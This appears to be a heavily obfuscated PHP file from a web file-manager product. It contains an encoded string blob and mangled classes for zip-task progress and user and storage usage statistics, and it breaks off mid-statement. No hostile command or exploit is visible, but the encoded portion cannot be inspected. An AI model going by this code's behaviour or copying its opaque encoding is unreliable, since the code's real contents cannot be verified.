\112\312\33\144\173\267\72\301"."\166\341\7\230\262\346\210\373\51\102\14\361\76\271\344\172\154\111\132\64\304\340\126\176\36\312\135\310\127\366\0\212\102\136\221\125\20\252\303\54\142\57\115\354\114\112\62\113\237"."\236\114\177\172\341\227\155\147\336\106\120\102\5\237\254\345\110\325\232\65\162\151\213\153\4\11\100\247\56\4\5\244\24\126\212\321\330\153\271\344\231\266\66\106\223\341\315\225\112"."\xef\x70\x61\x2f\x7c\xee\xa7\x63\xc4\x8b\x3c\x62\xef\x74\xbf\x50\xc2\xef\xb5\x6d\xb1\x18\x6c\xc7\xf5\x26\x4e\xd2\x4c\x6a\x3\x3e\xca\x91\x61\xaa\x26\x62\x2d\x63\x72\x58\xd6\x65\x25\xbd\x40\x89\x4c".strrev(''."\n".''."\n".'6W'."\0".'öÎ”Ó¡bˆeÎgTâå¯ÙœérŸ§V‘uyÔ”k³ÈûK¹ŞÀÊ@½óæ—˜').strrev('†½)±Ù<çIj†…èD*W9pG!tœàB}EéWo1*’zÒ'."\0".'Ë¿ôL·“V¸¢Åj')."\24\46\147\220\35\265\263\233\336\73\2\231\47\252\244\62\63\151\310\37\141\267\303\134\110\336\56\275\263\36\54\277\115\306\372\201\100\143\310\373\315\102\315\202\30\243\313\107\63"."\310\240\314\127\4\262\270\226\66\106\56\304\37\323\247\356\10\355\220\131\371\157\201\112\117\20\301\223\172\225\136\24\242\153\201\374\264\351\31\176\314\301\161\261\335\313\116\73\204".base64_decode('1on3tbvyl/vYK31sMcETfRXe3Zvw2T6fsDf8toeKhFWc+1lm3A/OLPCTRNlhxHsO4Q==')."\303\352\51\20\367\16\162\322\54\227\30\213\373\166\327\243\202\122\257\201\330\225\77\114\50\15\203\324\357\222\225\363\21\325\3\37\163\172\127\361\155\103\327\263\111\336\11\255\360"."\72\342\167\126\10\312\313\344\30\226\166\323\301\306\371\375\26\273\270\365\146\63\134\270\253\132\272\260\230\241\56\115\313\266\214\25\371\164\375\214\206\271\262\270\103\114\241\270\375".base64_decode('BFcBcCsL/ItACsWNhgrzoyrTA5Lo1kMvf1bTsyf8zxaMOE/QrJKWd/kDxGUjQPBUUg==').base64_decode('ipK2SI+Si4n1Tmyx6uimKJ7PdH+LMhQV+iHthGKx0OcPzRw+deexNN+xNPcRs9JJig==')."\214\4\73\266\31\344\31\161\335\333\166\62\60\40\137\21\311\322\121\113\256\321\61\275\302\41\134\34\357\224\104\320\31\53\344\140\43\307\26\326\142\265\111\224\350\177\60\201\354".base64_decode('1EQPWEL/qULPg8cw0lLheUtJR+Rb2k35PX5C9GuOX0JISaCoOzEywUAixEHW3VdP9Q==')."\xa8\x98\xa8\xa3\xcf\xa7\x4c\x94\xa9\x9c\xe9\x93\x5e\xc1\x14\xbe\xb9\x24\x76\xf\x97\x66\x66\x97\x13\xc8\x1\x88\xd5\x9f\x9b\x71\x92\x5f\xef\x23\x96\x73\xc2\x15\x5\x59\xae\xae\xa5\x2b\xb9\x2a\x96"."\x2d\xcf\x48\x45\xf2\x9a\x28\xaf\x5a\x7a\xb\x51\xc8\x89\x88\x60\x9\x7a\x4\xb\x9a\x28\x36\x90\x66\x86\x16\x72\x83\x45\x4d\x52\x60\x73\xb\xaf\xf0\x50\x4b\xaf\xd9\x9a\x72\x58\x4c\x1\x26\xfb\x31"."\346\364\25\175\335\165\370\104\361\66\317\273\307\204\104\171\37\103\146\103\104\350\202\40\171\222\335\253\353\244\303\137\203\163\235\174\154\357\223\220\210\377\223\235\70\243\250\367\341"."\x5c\xa0\x8d\xc4\xb8\x85\x7e\x4d\xda\x5d\xc5\x46\x2a\x42\x5d\xa5\xbc\x88\x48\x12\x5f\x72\xc8\xe2\x89\x2e\xf3\x60\xec\x70\xca\x43\x6\x98\xd1\xb1\xed\x79\x10\x96\xba\xd4\xa5\x61\x76\x16\xf8\xbf\x7e"."\15\361\377\325\43\210\15\165\114\66\357\172\57\171\41\160\344\214\345\33\227\134\170\123\271\260\247\37\356\35\164\117\300\42\376\120\270\24\347\352\320\314\351\30\363\105\246\261\373"."\61\55\227\223\366\331\312\147\230\262\227\150\21\362\15\362\147\115\53\105\274\306\163\336\127\151\127\261\307\334\311\203\263\175\225\62\12\62\304\217\112\25\360\230\202\30\77\54\75"."\x53\x6e\xa4\x6\x2b\x5c\x6e\x13\xad\x4f\xb7\xb\x6c\x89\xff\x28\xcb\x26\xda\x80\xd8\x14\xe6\xcd\x2d\xc8\x42\x29\x7c\x46\x24\xae\x14\x60\xf4\x64\xab\xd7\x58\x91\x9d\x26\x6b\x81\xe8\xf7\x1d\xc3\x88"."\23\61\261\7\32\45\323\45\27\250\214\232\45\135\163\342\2\312\303\15\163\210\355\206\331\164\272\112\164\172\136\337\244\231\154\171\154\135\362\374\162\135\207\362\322\234\16\310\105"."\xb0\x16\xba\x5b\xc4\xc5\x1f\x51\xaf\xf3\xbe\xaa\x3e\xdd\xef\xa9\x8e\x3f\x40\xea\xc6\x75\xd7\x8b\x98\x54\x3f\x4\x2d\x90\x38\x96\x7b\x30\x49\x16\xb9\x12\x22\x77\xc3\xfe\xf2\x32\x14\xaf\x13\x22\xcf"."\x4\x2b\xab\xf2\xfa\xe6\x8d\x12\x62\x3d\x1c\x92\xc7\x83\xd1\x89\x6e\xcb\x24\xbc\xa0\x1b\xca\x65\x41\x92\xfe\xaf\xf4\x18\x78\x19\x7b\x47\xc1\x93\x3\x65\x9b\x14\x23\x99\xae\x99\x42\xa7\x3f\x71\x15"."\x69\x98\xc4\x95\x3e\x2b\xda\xd3\x59\x43\xcc\xa0\x0\xd1\xd1\x81\xa4\xdd\x14\x28\x23\xbd\xc6\x8d\x17\xa6\x70\x38\x89\xb5\x9d\x89\x54\x52\xe6\x3\x98\x11\xa2\xa4\xd8\xf\x20\x97\xec\xd0\x96\x5f\x2d"."\161\227\304\246\32\356\45\270\240\122\266\224\151\331\122\66\16\257\224\27\43\246\54\33\221\323\360\113\312\216\153\212\304\253\10\336\327\20\210\304\200\12\1\134\262\0\270\74\226"."\x41\xd2\x65\x2a\x62\xdf\xd3\xee\xe7\x55\x48\x22\x1\x33\xdf\xa4\x50\x83\x74\x1d\xe8\xbe\x8d\xe5\x7e\xdf\xcb\xc8\x6d\xc9\x88\x4a\xc9\xa4\x14\x73\x79\x87\x7e\xb1\xa1\x66\x44\x78\xae\x20\xc9\xf4\xa2"."\43\64\254\161\347\60\336\122\356\367\333\245\273\333\24\101\310\160\371\365\234\270\65\224\230\25\126\14\237\255\304\76\342\201\127\172\216\74\243\15\13\116\113\160\367\351\164\273\66"."\x5c\x21\x6b\x9a\x9d\x6f\x38\x14\x41\x78\x56\xc2\xa9\x49\x36\xce\xc2\xce\x40\x1f\xf1\xbe\xd7\x1c\x90\xed\xa2\x5d\x19\xcb\xa1\xc2\x6\x5a\x2a\x2f\x2e\x6a\x44\x37\x31\xac\x52\xf7\xc9\x42\x73\x17\x97"."\155\254\71\122\11\20\175\40\203\53\72\110\47\51\254\11\42\64\40\150\127\270\300\100\174\322\155\321\315\263\361\71\103\171\210\165\222\337\5\365\234\15\261\154\206\261\35\236\44"."\133\176\153\331\175\45\53\113\60\44\24\320\163\121\251\72\371\272\166\302\2\211\312\37\21\130\351\36\142\311\24\136\44\260\35\322\164\15\276\104\42\171\307\40\147\134\116\164\65"."\xc7\x3b\xb5\xe4\x58\x23\xd0\x97\x2\xf3\x44\x54\x4c\xd3\x42\xee\x24\x9a\x5f\xf7\xb4\x5e\x2e\xe0\xed\x19\x2d\x61\x8f\x18\x4e\x2a\x2b\x9d\xb5\xca\x13\xcb\xe1\x56\xd9\xa0\xc2\x87\x2a\xb7\xd7\xdb\x2a"."\x36\xa6\xde\x13\xa8\xa8\xa4\xac\x3d\x92\xce\x47\xd2\xac\x50\x86\xb6\xa8\x62\x31\x9a\x84\x4b\xa\x9e\xd7\x55\x76\x82\x21\xc0\x65\x69\x12\x2e\x5b\x96\xcc\xa\x4b\x2\x1b\xa9\x9c\xa3\x95\xec\x9\xba"."\x57\x3e\x78\x20\xc5\x48\x57\xe8\xb0\xe7\xac\x4f\xb3\x4e\x34\x9e\x15\x33\x97\x7f\xe\x30\xce\x9b\x9b\x88\x3d\x2a\xb7\x42\x48\x2b\x3c\x77\xef\x95\x5a\x51\x31\xf3\x84\xad\x10\xb9\x3d\xbb\x40\x25\x5a"."\313\122\52\120\127\112\71\46\324\107\21\72\32\345\144\136\244\125\320\30\241\237\304\133\270\354\371\252\102\262\254\176\122\131\101\45\136\221\62\330\156\315\21\17\134\36\67\160\250".base64_decode('CswXICM6jeaMQaGZxxTzJ7vIf6kwWDD5lpIWipdYaTxkece5rDY3GhdKko/ainYCPg==').strrev('g$š\\6HPP¢°©’^)BrGÙÓE€vWíİ)é•cĞX Õv4ç¥?(;,').base64_decode('bKAQ0dP6JAZH4IjLNoayFXCzQa9JW/F1PL8gI05d6TZMkxOm5fhwWtIskt8W03GE2g==')."\x0\x15\x25\x10\xde\x11\xef\xa5\x3e\x49\x2b\x6\x85\xc4\x6d\x18\x6e\x14\xb9\x54\x21\x68\x4c\xa8\x11\x9\xc2\x85\x2d\x3e\xa3\x27\x74\x9a\x4a\x68\x98\x2b\x82\x2f\x6b\x78\x44\xde\x2a\xe1\xe2\xb6\xbd"."\344\271\132\26\0\164\40\356\67\107\231\27\52\154\240\57\332\43\256\163\64\57\177\50\130\33\100\115\131\307\207\270\101\260\203\64\45\10\317\56\370\111\35\360\336\133\140\155\161".base64_decode('wFWcvpTFdXG/rQYQ6YoqqM91ImsD46JEMlGW1B1KJJbF4m3URXtZMikl6UyVJXV3xA==')."\272\46\112\13\167\206\42\321\262\64\254\136\325\245\12\177\146\64\51\322\115\132\111\356\50\47\152\105\244\165\261\150\11\271\15\27\67\5\305\254\311\56\0\330\115\112\102\313\61"."\271\200\144\333\253\347\205\43\73\121\306\55\356\220\347\325\146\36\47\171\300\375\336\221\107\213\221\41\54\124\204\125\243\272\240\356\170\21\240\330\145\75\247\3\234\7\27\327\373"."\1\227\32\200\4\47\153\203\20\37\11\347\344\75\232\0\246\126\34\40\131\312\134\176\353\101\122\305\0\340\206\55\62\101\257\156\255\331\57\335\152\320\23\20\230\317\302\220\112"."\352\157\64\354\112\166\264\201\212\267\341\124\232\210\127\277\220\363\375\157\334\245\231\332\377\256\0\0".""."", 10, -8))); goto D¯ï×˜å¶Ò; DšëƒËï¾: class TaskZip extends TaskFileTransfer { protected function startAfter() { $ü÷—•İ¸ =& $_SERVER[èùÙ¹Ïö]; parent::startAfter(); Hook::bind($ü÷—•İ¸[1820], array($this, $ü÷—•İ¸[1810])); Hook::bind($ü÷—•İ¸[1812], array($this, $ü÷—•İ¸[1813])); $Á­‡•éĞ =& $this->task; $Á­‡•éĞ[$ü÷—•İ¸[1814]] = $ü÷—•İ¸[1242]; if (!$Á­‡•éĞ[$ü÷—•İ¸[1592]]) { $Á­‡•éĞ[$ü÷—•İ¸[1592]] = LNG($ü÷—•İ¸[1821]); } } protected function endAfter() { $ÂªŞËëĞ =& $_SERVER[èùÙ¹Ïö]; parent::endAfter(); Hook::unbind($ÂªŞËëĞ[1820], array($this, $ÂªŞËëĞ[1810])); Hook::unbind($ÂªŞËëĞ[1812], array($this, $ÂªŞËëĞ[1813])); } public function updateAfter() { $»ü°Ğ¨À =& $_SERVER[èùÙ¹Ïö]; $êäŞˆœÑ =& $this->task; if (!$êäŞˆœÑ[$»ü°Ğ¨À[826]] || !$êäŞˆœÑ[$»ü°Ğ¨À[803]]) { return; } if ($êäŞˆœÑ[$»ü°Ğ¨À[1814]] == $»ü°Ğ¨À[1242]) { $¹æ±ç¨ = $êäŞˆœÑ[$»ü°Ğ¨À[1750]]; if ($êäŞˆœÑ[$»ü°Ğ¨À[1751]] != $»ü°Ğ¨À[1242]) { $¹æ±ç¨ = 0; } $Û³¨Í» = ($êäŞˆœÑ[$»ü°Ğ¨À[1754]] + $¹æ±ç¨) / $êäŞˆœÑ[$»ü°Ğ¨À[803]]; $êäŞˆœÑ[$»ü°Ğ¨À[1698]] = $Û³¨Í» * 0.3; } else { if ($êäŞˆœÑ[$»ü°Ğ¨À[1814]] == $»ü°Ğ¨À[359]) { $Û³¨Í» = $êäŞˆœÑ[$»ü°Ğ¨À[1697]] / $êäŞˆœÑ[$»ü°Ğ¨À[826]]; $êäŞˆœÑ[$»ü°Ğ¨À[1698]] = 0.3 + $Û³¨Í» * 0.5; } else { if ($êäŞˆœÑ[$»ü°Ğ¨À[1814]] == $»ü°Ğ¨À[109]) { $Û³¨Í» = 0; if ($êäŞˆœÑ[$»ü°Ğ¨À[1749]]) { $Û³¨Í» = $êäŞˆœÑ[$»ü°Ğ¨À[1750]] / $êäŞˆœÑ[$»ü°Ğ¨À[1749]]; } $êäŞˆœÑ[$»ü°Ğ¨À[1698]] = 0.3 + 0.5 + $Û³¨Í» * 0.2; } } } if ($êäŞˆœÑ[$»ü°Ğ¨À[1698]] > 0) { $õó¦›Éé = timeFloat() - $êäŞˆœÑ[$»ü°Ğ¨À[1700]] - $êäŞˆœÑ[$»ü°Ğ¨À[1703]]; $êäŞˆœÑ[$»ü°Ğ¨À[1704]] = $õó¦›Éé * (1 - $êäŞˆœÑ[$»ü°Ğ¨À[1698]]) / $êäŞˆœÑ[$»ü°Ğ¨À[1698]]; } } public function copyFileStart($Ã¨§¬‘ı, $ºí“Ÿ¨‡, $óòö«Ó, $Úßå º, $¿¤É¼¬Ä, $Òñ½ûÔ¯) { $€»ñÙ¥š =& $_SERVER[èùÙ¹Ïö]; parent::copyFileStart($Ã¨§¬‘ı, $ºí“Ÿ¨‡, $óòö«Ó, $Úßå º, $¿¤É¼¬Ä, $Òñ½ûÔ¯); $ßœÛìË† =& $this->task; if ($ßœÛìË†[$€»ñÙ¥š[1814]] == $€»ñÙ¥š[359]) { $ßœÛìË†[$€»ñÙ¥š[1814]] = $€»ñÙ¥š[109]; } $this->update(); } public function copyFileEnd($Ş¦—ÓÜš, $ğŒÆÈæ², $¬ˆÈ€—â, $­ØÀ²Šú, $“õÓ¥Á, $Å÷¢ö¼) { $¥“ìçƒ =& $_SERVER[èùÙ¹Ïö]; $Ï¾ÏÎ«¬ =& $this->task; $Ï¾ÏÎ«¬[$¥“ìçƒ[1750]] = $Ï¾ÏÎ«¬[$¥“ìçƒ[1749]]; $Ï¾ÏÎ«¬[$¥“ìçƒ[1754]] += $Ï¾ÏÎ«¬[$¥“ìçƒ[1749]]; $Ï¾ÏÎ«¬[$¥“ìçƒ[1751]] = $¥“ìçƒ[12]; $this->update(); } public function zipEvent($ìˆÑ šù, $Ÿ¸Ğ‹¢Á, $íƒåÒ, $«©éãª§) { $æí·’¥“ =& $_SERVER[èùÙ¹Ïö]; $êĞáÄ½ =& $this->task; $êĞáÄ½[$æí·’¥“[1747]] = get_path_this($Ÿ¸Ğ‹¢Á); $êĞáÄ½[$æí·’¥“[1749]] = $«©éãª§; $êĞáÄ½[$æí·’¥“[1750]] = $íƒåÒ; $êĞáÄ½[$æí·’¥“[1110]] = $ìˆÑ šù == $æí·’¥“[1822] ? $æí·’¥“[1817] : $æí·’¥“[1818]; $êĞáÄ½[$æí·’¥“[1751]] = $æí·’¥“[12]; $êĞáÄ½[$æí·’¥“[803]] = $«©éãª§; $êĞáÄ½[$æí·’¥“[1814]] = $æí·’¥“[359]; $this->update(); } public function nameParse($ÑéØ) { $ÌµòÆâ =& $_SERVER[èùÙ¹Ïö]; $…»ëÃ¿• =& $this->task; if ($…»ëÃ¿•[$ÌµòÆâ[1697]] < $…»ëÃ¿•[$ÌµòÆâ[826]]) { $ëÌÒÅÕ = get_path_this($ÑéØ); if (strstr($ëÌÒÅÕ, $ÌµòÆâ[10])) { $…»ëÃ¿•[$ÌµòÆâ[1697]] += 1; } } if ($…»ëÃ¿•[$ÌµòÆâ[1814]] == $ÌµòÆâ[1242]) { $…»ëÃ¿•[$ÌµòÆâ[1814]] = $ÌµòÆâ[359]; } $…»ëÃ¿•[$ÌµòÆâ[1747]] = $ÑéØ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($Ä¤ˆÁÏ) { $µñšƒÆÙ =& $_SERVER[èùÙ¹Ïö]; $€‰úúåÉ = array($µñšƒÆÙ[633] => array($µñšƒÆÙ[33] => $µñšƒÆÙ[1823], $µñšƒÆÙ[319] => array($µñšƒÆÙ[241], $µñšƒÆÙ[805], $µñšƒÆÙ[1824], $µñšƒÆÙ[1825])), $µñšƒÆÙ[1826] => array($µñšƒÆÙ[33] => $µñšƒÆÙ[1827], $µñšƒÆÙ[319] => array($µñšƒÆÙ[241], $µñšƒÆÙ[803], $µñšƒÆÙ[1828], $µñšƒÆÙ[1829], $µñšƒÆÙ[1830]))); if (!isset($€‰úúåÉ[$Ä¤ˆÁÏ])) { return !1; } $this->optionType = $€‰úúåÉ[$Ä¤ˆÁÏ][$µñšƒÆÙ[33]]; $this->field = $€‰úúåÉ[$Ä¤ˆÁÏ][$µñšƒÆÙ[319]]; return !0; } public function listData($‚ú´ƒŞ = false, $ËÅåÅâ = "\x6d\157\144\151\146\x79\124\x69\155\x65", $…òİ® = false) { return parent::listData($‚ú´ƒŞ, $ËÅåÅâ, $…òİ®); } public function trendList($›Å˜éˆ») { $üş²É… =& $_SERVER[èùÙ¹Ïö]; $çÜ†Ä“ = $this->listData(); if ($çÜ†Ä“) { $Êœ¼ØÉ³ = end($çÜ†Ä“); $Ç¨ñ·Üã = date($üş²É…[1831], strtotime($üş²É…[1832])); if ($Êœ¼ØÉ³[$üş²É…[241]] == $Ç¨ñ·Üã) { return $çÜ†Ä“; } $ÀÂÁ‡Á£ = strtotime($Êœ¼ØÉ³[$üş²É…[241]]); } if (!isset($ÀÂÁ‡Á£)) { $·¥ÅôÛı = $›Å˜éˆ» == $üş²É…[633] ? $üş²É…[570] : $üş²É…[865]; $ÀÂÁ‡Á£ = Model($·¥ÅôÛı)->min($üş²É…[217]); } $ç•ìßåû = $üş²É…[1833] . ucfirst($›Å˜éˆ»); $úÀ«Ì°á = $this->dateList($ÀÂÁ‡Á£); foreach ($úÀ«Ì°á as $Ç¨ñ·Üã) { $this->{$ç•ìßåû}($Ç¨ñ·Üã); } return $this->listData(); } private function dateList($¨×¡ô’¯) { $¾ßØÜ·ä =& $_SERVER[èùÙ¹Ïö]; $¾‡­ÙøÁ = $¨×¡ô’¯; $ëÒ Î‹ = strtotime($¾ßØÜ·ä[1832]); $Ê²ôğ´– = array(); while ($¾‡­ÙøÁ <= $ëÒ Î‹) { $Ê²ôğ´–[] = date($¾ßØÜ·ä[1831], $¾‡­ÙøÁ); $¾‡­ÙøÁ = strtotime($¾ßØÜ·ä[1834], $¾‡­ÙøÁ); } return $Ê²ôğ´–; } public function _recordUser($Ğôôû¡ = '') { $ùÌ¶ÊŠÔ =& $_SERVER[èùÙ¹Ïö]; $©¬‹ãÒ = strtotime(date($ùÌ¶ÊŠÔ[1835], strtotime($Ğôôû¡))); $€ùú˜Ø¡ = strtotime(date($ùÌ¶ÊŠÔ[1836], strtotime($Ğôôû¡))); $ŸºÃßù¦ = array($ùÌ¶ÊŠÔ[217] => array($ùÌ¶ÊŠÔ[1059], $€ùú˜Ø¡)); $¿‹ÌˆÔ¯ = Model($ùÌ¶ÊŠÔ[570])->where($ŸºÃßù¦)->count($ùÌ¶ÊŠÔ[1696]); $ŸºÃßù¦[$ùÌ¶ÊŠÔ[217]] = array($ùÌ¶ÊŠÔ[379], array($©¬‹ãÒ, $€ùú˜Ø¡)); $Áøé´‡ù = Model($ùÌ¶ÊŠÔ[570])->where($ŸºÃßù¦)->count($ùÌ¶ÊŠÔ[1696]); $ŸºÃßù¦[$ùÌ¶ÊŠÔ[33]] = $ùÌ¶ÊŠÔ[1837]; $ïœˆ´Ç = Model($ùÌ¶ÊŠÔ[1838])->where($ŸºÃßù¦)->count($ùÌ¶ÊŠÔ[1839]); $Ø»ñ¡ = array($ùÌ¶ÊŠÔ[241] => $Ğôôû¡, $ùÌ¶ÊŠÔ[805] => (int) $¿‹ÌˆÔ¯, $ùÌ¶ÊŠÔ[1824] => (int) $Áøé´‡ù, $ùÌ¶ÊŠÔ[1825] => (int) $ïœˆ´Ç); return $this->insert($Ø»ñ¡); } public function _recordStore($‡üñÕ = '') { $¤™¸ö—ş =& $_SERVER[èùÙ¹Ïö]; $á©–ìòË = strtotime(date($¤™¸ö—ş[1836], strtotime($‡üñÕ))); $Ÿæè…ªÒ = array($¤™¸ö—ş[217] => array($¤™¸ö—ş[1059], $á©–ìòË)); $Àö‘©Á¹ = Model($¤™¸ö—ş[514])->where($Ÿæè…ªÒ)->sum($¤™¸ö—ş[78]); $Ÿæè…ªÒ[$¤™¸ö—ş[455]] = 0; $‹‚™ñ€Â = Model($¤™¸ö—ş[865])->where($Ÿæè…ªÒ)->sum($¤™¸ö—ş[78]); $Ÿæè…ªÒ[$¤™¸ö—ş[180]] = 1; $¼—¦å™˜ = Model($¤™¸ö—ş[865])->where($Ÿæè…ªÒ)->sum($¤™¸ö—ş[78]); $Ÿæè…ªÒ[$¤™¸ö—ş[180]] = 2; $âƒÚî±ğ = Model($¤™¸ö—ş[865])->where($Ÿæè…ªÒ)->sum($¤™¸ö—ş[78]); $æÓŞØ ê = array($¤™¸ö—ş[241] => $‡üñÕ, $¤™¸ö—ş[803] => (int) $‹‚™ñ€Â, $¤™¸ö—ş[1828] => (int) $Àö‘©Á¹, $¤™¸ö—ş[1829] => (int) $¼—¦å™˜, $¤™¸ö—ş[1830] => (int) $âƒÚî±ğ); return $this->insert($æÓŞØ ê); } public function trend($è—Ù·ıè, $É œÇÁÆ) { $Î«¤”ÖÜ =& $_SERVER[èùÙ¹Ïö]; if (!$this->init($è—Ù·ıè)) { return !1; } $ŞÕ·ÆƒĞ = $this->trendList($è—Ù·ıè); if ($ŞÕ·ÆƒĞ && $É œÇÁÆ != $Î«¤”ÖÜ[1669]) { $´Ë’¶Ïë = $ŞÕ·ÆƒĞ[0][$Î«¤”ÖÜ[241]]; $ìâ²áÅ = $this->validDate($É œÇÁÆ, $´Ë’¶Ïë); $Ÿİö¹µ = array(); $€¾ó£ïÂ = array_to_keyvalue($ŞÕ·ÆƒĞ, $Î«¤”ÖÜ[241]); foreach ($ìâ²áÅ as $çç•³îÒ) { if (isset($€¾ó£ïÂ[$çç•³îÒ])) { $‡«»Á¢÷ = $€¾ó£ïÂ[$çç•³îÒ]; } else { $‡«»Á¢÷ = end($ŞÕ·ÆƒĞ); $‡«»Á¢÷[$Î«¤”ÖÜ[241]] = $çç•³îÒ; if ($è—Ù·ıè == $Î«¤”ÖÜ[633]) { $‡«»Á¢÷[$Î«¤”ÖÜ[1824]] = $‡«»Á¢÷[$Î«¤”ÖÜ[1825]] = 0; } } $Ÿİö¹µ[] = $‡«»Á¢÷; } $ŞÕ·ÆƒĞ = $Ÿİö¹µ; } $Š€ù… Í = array($Î«¤”ÖÜ[633] => array($Î«¤”ÖÜ[805] => LNG($Î«¤”ÖÜ[1840]), $Î«¤”ÖÜ[1824] => LNG($Î«¤”ÖÜ[1841]), $Î«¤”ÖÜ[1825] => LNG($Î«¤”ÖÜ[1842])), $Î«¤”ÖÜ[1826] => array($Î«¤”ÖÜ[803] => LNG($Î«¤”ÖÜ[1843]), $Î«¤”ÖÜ[1828] => LNG($Î«¤”ÖÜ[1844]), $Î«¤”ÖÜ[1829] => LNG($Î«¤”ÖÜ[1845]), $Î«¤”ÖÜ[1830] => LNG($Î«¤”ÖÜ[1846]))); $àñô¶á£ = array($Î«¤”ÖÜ[633] => $Î«¤”ÖÜ[1847], $Î«¤”ÖÜ[1826] => $Î«¤”ÖÜ[78]); if (empty($ŞÕ·ÆƒĞ)) { $çç•³îÒ = date($Î«¤”ÖÜ[1831], strtotime($Î«¤”ÖÜ[1832])); $ÒÊëˆÖú = array($Î«¤”ÖÜ[241] => $çç•³îÒ); foreach ($Š€ù… Í[$è—Ù·ıè] as $Ì¨á¹œ‡ => $áÂ¦ö¿) { $ÒÊëˆÖú[$Ì¨á¹œ‡] = 0; } $ŞÕ·ÆƒĞ[] = $ÒÊëˆÖú; } $¶ŸâÂ© = array(); foreach ($ŞÕ·ÆƒĞ as $áÂ¦ö¿) { if ($è—Ù·ıè == $Î«¤”ÖÜ[1826] && $áÂ¦ö¿[$Î«¤”ÖÜ[1828]] > $áÂ¦ö¿[$Î«¤”ÖÜ[803]]) { $áÂ¦ö¿[$Î«¤”ÖÜ[1828]] = $áÂ¦ö¿[$Î«¤”ÖÜ[803]]; } foreach ($Š€ù… Í[$è—Ù·ıè] as $Ì¨á¹œ‡ => $¹ñšˆóÚ) { $‡«»Á¢÷ = array($Î«¤”ÖÜ[241] => $áÂ¦ö¿[$Î«¤”ÖÜ[241]], $Î«¤”ÖÜ[1592] => $¹ñšˆóÚ); $‡«»Á¢÷[$àñô¶á£[$è—Ù·ıè]] = isset($áÂ¦ö¿[$Ì¨á¹œ‡]) ? $áÂ¦ö¿[$Ì¨á¹œ‡] : 0; $¶ŸâÂ©[] = $‡«»Á¢÷; } } return $¶ŸâÂ©; } public function validDate($Î«‹’Ò¢, $òØ§ìé¿) { $œğÈØŞ =& $_SERVER[èùÙ¹Ïö]; $å÷‚«§” = date($œğÈØŞ[1831], strtotime($œğÈØŞ[1832])); $îòÉ¥ëı = array($å÷‚«§”); switch ($Î«‹’Ò¢) { case $œğÈØŞ[1676]: $ä…˜õé¨ = mktime(0, 0, 0, date($œğÈØŞ[1848]), date($œğÈØŞ[1409]) - date($œğÈØŞ[1474]) + 7 - 7, date($œğÈØŞ[1849])); $Îş”ûœû = 0; do { $ñÉé«›” = date($œğÈØŞ[1831], $ä…˜õé¨ - 3600 * 24 * 7 * $Îş”ûœû); $îòÉ¥ëı[] = $ñÉé«›”; $Îş”ûœû++; } while ($òØ§ìé¿ < $ñÉé«›”); break; case $œğÈØŞ[1674]: $Îş”ûœû = 1; do { $²™¦¡ë® = date($œğÈØŞ[1850], strtotime("\55\40{$Îş”ûœû}\40\x6d\x6f\x6e\164\150\x73")); $îòÉ¥ëı[] = $²™¦¡ë®; $Îş”ûœû++; } while ($òØ§ìé¿ < $²™¦¡ë®); break; case $œğÈØŞ[1851]: $–±¼¯  = (int) date($œğÈØŞ[1849], strtotime($òØ§ìé¿)); $òÔİ¶ïÑ = (int) date($œğÈØŞ[1849]); if ($–±¼¯  >= $òÔİ¶ïÑ) { break; } for ($–±¼¯ ; $–±¼¯  < $òÔİ¶ïÑ; $–±¼¯ ++) { $îòÉ¥ëı[] = $–±¼¯  . $œğÈØŞ[1852]; } break; default: break; } if ($òØ§ìé¿ > end($îòÉ¥ëı)) { array_pop($îòÉ¥ëı); } sort($îòÉ¥ëı); return $îòÉ¥ëı; } public function listTable($£‚°Æ¿º) { $äØÎÅ¿™ = ucfirst($£‚°Æ¿º); return Model($äØÎÅ¿™)->listData(); } public function option($ß¡“ßÔ—) { $úù­™‰¨ = $_SERVER[èùÙ¹Ïö][1853] . ucfirst($ß¡“ßÔ—); return $this->{$úù­™‰¨}(); } private function optionUser() { $ˆŠëíèâ =& $_SERVER[èùÙ¹Ïö]; $ëÁ”†Óı = Model($ˆŠëíèâ[570])->count($ˆŠëíèâ[1696]); $Ô¡Šß°ï = Model($ˆŠëíèâ[570])->where($ˆŠëíèâ[1854])->count($ˆŠëíèâ[1696]); $“„¹Çº = intval($GLOBALS[$ˆŠëíèâ[6]][$ˆŠëíèâ[395]][$ˆŠëíèâ[1648]]) / 3600; $Ø¾óÓµ“ = strtotime("\55{$“„¹Çº}\x20\x68\x6f\165\x72\163"); $ÅñŸè£‰ = strtotime(date($ˆŠëíèâ[1835])); if ($Ø¾óÓµ“ < $ÅñŸè£‰) { $Ø¾óÓµ“ = $ÅñŸè£‰; } $é¥ŒÛ  = array($ˆŠëíèâ[1855] => array($ˆŠëíèâ[1060], $Ø¾óÓµ“)); $úşì’Ú = (int) Model($ˆŠëíèâ[570])->where($é¥ŒÛ )->count($ˆŠëíèâ[1696]); if (!$úşì’Ú) { $úşì’Ú = 1; } $é¥ŒÛ  = array($ˆŠëíèâ[1855] => array($ˆŠëíèâ[1060], $ÅñŸè£‰)); $¨—…›æ¬ = Model($ˆŠëíèâ[570])->where($é¥ŒÛ )->count($ˆŠëíèâ[1696]); return array($ˆŠëíèâ[798] => (int) $ëÁ”†Óı, $ˆŠëíèâ[1856] => (int) ($ëÁ”†Óı - $Ô¡Šß°ï), $ˆŠëíèâ[1857] => (int) $Ô¡Šß°ï, $ˆŠëíèâ[1858] => (int) $¨—…›æ¬, $ˆŠëíèâ[1859] => $úşì’Ú); } private function optionFile() { $ºÈ›„»ì =& $_SERVER[èùÙ¹Ïö]; $Àïóì¡ = $this->sourceSize(); $¨Ê¼şˆ = $Àïóì¡[$ºÈ›„»ì[78]]; $á¨ÔÙì = $Àïóì¡[$ºÈ›„»ì[1828]]; $Âğ°ïÃÛ = Model($ºÈ›„»ì[865])->where(array($ºÈ›„»ì[455] => 0))->count($ºÈ›„»ì[183]); $åô€®İ = array($ºÈ›„»ì[455] => 0, $ºÈ›„»ì[217] => array($ºÈ›„»ì[1060], strtotime(date($ºÈ›„»ì[1835])))); $ªÊç¦„ª = Model($ºÈ›„»ì[865])->where($åô€®İ)->sum($ºÈ›„»ì[78]); $İÚÂÜæ = Model($ºÈ›„»ì[865])->where($åô€®İ)->count($ºÈ›„»ì[183]); return array($ºÈ›„»ì[803] => $¨Ê¼şˆ, $ºÈ›„»ì[1828] => $á¨ÔÙì, $ºÈ›„»ì[1860] => $¨Ê¼şˆ - $á¨ÔÙì, $ºÈ›„»ì[1861] => (int) $ªÊç¦„ª, $ºÈ›„»ì[805] => (int) $Âğ°ïÃÛ, 